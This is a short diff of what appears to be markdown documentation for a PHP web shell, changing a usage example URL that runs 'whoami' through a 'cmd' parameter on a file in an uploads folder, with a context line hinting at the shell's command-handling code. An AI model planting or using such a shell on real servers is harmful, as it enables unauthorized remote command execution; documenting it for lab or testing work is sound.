@@ -241,7 +241,7 @@ if(isset($_GET['cmd'])) {
 
 ### Usage Example
 ```
-http://localhost:8080/uploads/shell77.php?cmd=whoami
+http://localhost:8080/uploads/shell.php?cmd=whoami
 ```
 
 This version provides more verbose output and better formatting, which can be helpful for debugging or when more detailed command execution information is needed.
